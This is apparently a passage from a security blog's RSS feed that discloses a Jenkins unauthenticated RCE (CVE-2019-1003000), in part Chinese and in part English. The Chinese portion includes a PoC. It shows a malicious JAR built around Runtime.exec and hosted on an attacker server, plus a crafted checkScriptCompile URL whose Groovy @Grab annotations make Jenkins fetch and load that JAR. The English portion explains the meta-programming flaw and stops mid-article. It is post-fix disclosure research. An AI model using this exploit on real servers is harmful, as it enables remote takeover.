            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;影片:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;到此，我們已經可以完整的控制遠端伺服器! 透過 Meta-Programming 在語法樹解析時期去引入惡意的 JAR 檔，再透過 Java 的 Static Initializer 特性去執行任意指令! 雖然 Jenkins 有內建的 Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)，但這個漏洞是在編譯階段而非執行階段，導致 Sandbox 毫無用武之處!&lt;/p&gt;

&lt;p&gt;由於這是對於 Groovy 底層的一種攻擊方式，因此只要是所有可以碰觸到 Groovy 解析的地方皆有可能有漏洞產生! 而這也是這個漏洞好玩的地方，打破了一般開發者認為沒有執行就不會有問題的思維，對攻擊者來說也用了一個沒有電腦科學的理論知識背景不會知道的方法攻擊! 不然你根本不會想到 Meta-Programming! 除了我回報的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; 兩個進入點外，在漏洞被修復後，&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; 也很快的找到了另外一個&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;進入點&lt;/a&gt;去觸發這個漏洞!&lt;/p&gt;

&lt;p&gt;除此之外，這個漏洞更可以與我前一篇 &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; 所發現的漏洞串起來，去繞過 Overall/Read 的限制成為一個名符其實不用認證的遠端代碼執行漏洞!(如果你有好好的讀完這兩篇文章，應該對你不是難事XD) 至於有沒有更多的玩法? 就交給大家自由發揮串出自己的攻擊鏈囉!&lt;/p&gt;

&lt;p&gt;感謝大家的閱讀，Hacking Jenkins 系列文就在這裡差不多先告一個段落囉! 未來將會再發表更多有趣的技術研究敬請期待!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still can’t do much things :(&lt;/p&gt;

&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;

&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;

&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;

&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Macro&lt;/li&gt;
  &lt;li&gt;C++ Template&lt;/li&gt;
  &lt;li&gt;Java Annotation&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;
&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;

&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
